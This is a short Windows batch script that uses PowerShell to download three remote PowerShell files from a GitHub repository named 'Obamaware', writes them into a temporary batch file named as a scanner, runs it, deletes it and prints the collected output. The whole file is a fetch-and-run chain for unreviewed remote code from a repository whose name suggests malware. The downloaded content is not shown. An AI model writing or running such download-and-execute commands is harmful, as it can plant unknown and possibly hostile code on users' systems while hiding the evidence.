powershell.exe -Command New-Item ./temp_scanner.bat
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n.ps1").Content -Path "./temp_scanner.bat"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n2.ps1").Content -Path "./temp_scanner.bat"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n3.ps1").Content -Path "./temp_scanner.bat"
temp_scanner.bat >temp_out.txt 2>&1
del temp_scanner.bat
type temp_out.txt
type %TEMP%/out.txt
pause